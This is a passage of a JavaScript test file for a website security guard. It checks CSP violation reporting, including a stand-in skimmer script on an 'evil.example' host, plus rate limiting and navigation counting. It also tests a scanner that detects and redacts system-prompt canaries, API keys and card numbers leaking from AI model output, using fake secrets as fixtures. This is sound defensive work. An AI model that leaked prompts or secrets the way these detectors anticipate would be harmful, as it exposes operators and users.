  const res = await g.reports(post('/_bitora/r', rep))
  assert.equal(res.status, 204)
  assert.equal(await g.reports(new Request('https://shop.example.com/_bitora/r')), null, 'a GET is not a report')
  assert.equal(await g.reports(post('/api/other', rep)), null, 'another path is not a report')
  assert.equal((await g.reports(post('/_bitora/r', 'garbage'))).status, 204, 'garbage is answered and dropped')
  await g.flush()
  const sent = b.calls.events.flat()
  assert.equal(sent.length, 1)
  assert.equal(sent[0].kind, 'csp_violation')
  assert.equal(sent[0].param, 'script-src-elem.cdn.evil.example')
  assert.ok(!JSON.stringify(sent).includes('skim.js') && !JSON.stringify(sent).includes('t=1'), 'no script name, no query string')
  // the adapters call it first
  const mw = bitoraMiddleware(g)
  assert.equal((await mw(post('/_bitora/r', rep))).status, 204)
})

test('reports: anybody can post to that path, so one instance accepts a limited number per hour', async () => {
  const b = fakeBitora()
  let t = 1_000_000_000_000
  const g = createGuard({ secret: 'k', fetch: b.fetch, now: () => t, trustProxy: 1, remote: { enabled: false }, csp: { maxPerHour: 5 } })
  for (let i = 0; i < 20; i++) {
    const body = JSON.stringify({ 'csp-report': { 'effective-directive': 'script-src', 'blocked-uri': `https://h${i}.example/x.js` } })
    await g.reports(new Request('https://s.example.com/_bitora/r', { method: 'POST', body, headers: { 'content-type': 'application/csp-report' } }))
  }
  await g.flush()
  assert.equal(b.calls.events.flat().length, 5)
  t += 3600_001
  await g.reports(new Request('https://s.example.com/_bitora/r', { method: 'POST', body: JSON.stringify({ 'csp-report': { 'effective-directive': 'script-src', 'blocked-uri': 'https://again.example/x.js' } }), headers: { 'content-type': 'application/csp-report' } }))
  t += 25_000
  await g.flush()
  assert.equal(b.calls.events.flat().length, 6, 'a new hour, a new allowance')
})

test('navigations: the guard sends only how many page navigations of a browser it saw, so Bitora can say how much of them reaches the snippet', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'k', fetch: b.fetch, trustProxy: 1, remote: { enabled: false } })
  const nav = (path, extra = {}) => new Request('https://shop.example.com' + path, { headers: { 'x-forwarded-for': '203.0.113.7', 'user-agent': 'Mozilla/5.0 Chrome/120', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', ...extra } })
  for (let i = 0; i < 5; i++) await g.check(nav('/p' + i))
  await g.check(nav('/p', { 'sec-purpose': 'prefetch' })) // a browser guessing, not a person
  await g.check(new Request('https://shop.example.com/api/x', { headers: { 'x-forwarded-for': '203.0.113.7', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors' } }))
  await g.check(new Request('https://shop.example.com/', { headers: { 'x-forwarded-for': '203.0.113.7', 'user-agent': 'curl/8' } })) // a tool sends no Fetch Metadata
  await g.check(new Request('https://shop.example.com/', { method: 'POST', headers: { 'x-forwarded-for': '203.0.113.7', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate' } }))
  await g.flush()
  const sent = b.calls.events.flat().filter((e) => e.kind === 'navigations')
  assert.equal(sent.length, 1)
  assert.equal(sent[0].count, 5)
  assert.ok(!('path' in sent[0]) || sent[0].path === '/', 'no page is named, only a number')
  await g.flush()
  assert.equal(b.calls.events.flat().filter((e) => e.kind === 'navigations').length, 1, 'counted once')
  // with reporting off nothing is counted or sent
  const quiet = createGuard({ secret: 'k', fetch: b.fetch, trustProxy: 1, remote: { enabled: false }, report: { enabled: false } })
  await quiet.check(nav('/x'))
  await quiet.flush()
  assert.equal(b.calls.events.flat().filter((e) => e.kind === 'navigations').length, 1)
})

// ---- what a model answers (SERVER_AI_OUTPUT_LEAK) ----

import { scan as scanModel, redact as redactModel, canary as canaryOf } from './pkg/aiout.js'

test('model output: the canary of the system prompt, secrets and card numbers are recognised by kind, and redacted without touching the rest', async () => {
  const c = await canaryOf('bsec_key_one')
  assert.match(c, /^bsc_[0-9a-f]{12}$/)
  assert.equal(c, await canaryOf('bsec_key_one'), 'the same key gives the same canary on every instance')
  assert.notEqual(c, await canaryOf('bsec_key_two'))
  const aws = 'AKIA' + 'ABCDEFGHIJKLMNOP'
  assert.deepEqual(scanModel('Claro, mis instrucciones empiezan así: ' + c + ' Eres un asistente…', c), ['prompt-leak'])
  assert.deepEqual(scanModel('la clave es ' + aws, c), ['secret'])
  assert.deepEqual(scanModel('tarjeta 4111 1111 1111 1111 caduca 12/29', c), ['card'])
  assert.deepEqual(scanModel('Hola, ¿en qué te ayudo? Tu pedido 1234 5678 9012 3456 llegará pronto', c), [], 'a number that fails the Luhn check is not a card')
  assert.deepEqual(scanModel('Tu pedido 00000000000000 está en camino', c), [])
  assert.deepEqual(scanModel('texto normal', c), [])
  const out = redactModel(`ok ${c} y ${aws} y 4111-1111-1111-1111 fin`, c)
  assert.equal(out, 'ok [redacted] y [redacted] y [redacted] fin')
})

test('model output: aiOutput.check reports only the kind, redacts in enforce mode, only says it would in observe mode, and is inert without a licence', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'k', mode: 'enforce', fetch: b.fetch, trustProxy: 1, remote: { enabled: false } })
  const c = await g.aiOutput.canary()
  const leaked = `mis reglas: ${c} y la clave sk_live_${'a'.repeat(24)}`
  const r = await g.aiOutput.check(leaked)
  assert.deepEqual(r.kinds.sort(), ['prompt-leak', 'secret'])
  assert.ok(!r.text.includes(c) && !r.text.includes('sk_live_'), 'enforce: the text goes out redacted')
  await g.flush()
  const sent = b.calls.events.flat().filter((e) => e.kind === 'ai_output_leak')
  assert.deepEqual(sent.map((e) => e.param).sort(), ['prompt-leak', 'secret'])
  assert.ok(!JSON.stringify(sent).includes('sk_live_') && !JSON.stringify(sent).includes(c), 'only the kind travels')
  const obs = createGuard({ secret: 'k', fetch: b.fetch, trustProxy: 1, remote: { enabled: false } })
  const o = await obs.aiOutput.check(`dentro: ${await obs.aiOutput.canary()}`)
  assert.equal(o.wouldHave, 'redacted')
  assert.ok(o.text.includes('bsc_'), 'observe: the text is not changed')
  assert.deepEqual((await g.aiOutput.check('todo bien')).kinds, [])
  const inert = realCreateGuard({ secret: 'k', mode: 'enforce' }) // no licence
  assert.deepEqual(await inert.aiOutput.check('sk_live_' + 'a'.repeat(24)), { kinds: [], text: 'sk_live_' + 'a'.repeat(24) })
})
